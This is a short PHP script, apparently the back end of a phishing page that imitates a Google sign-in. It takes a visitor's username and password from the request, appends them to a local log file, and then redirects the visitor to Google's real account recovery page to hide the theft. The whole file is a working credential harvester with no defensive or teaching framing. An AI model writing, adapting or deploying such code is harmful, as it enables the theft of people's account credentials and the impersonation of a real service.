<?php

file_put_contents("/home/eilon26/Desktop/log.txt", "Username: " . $_GET['username'] . " Pass: " . $_GET['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
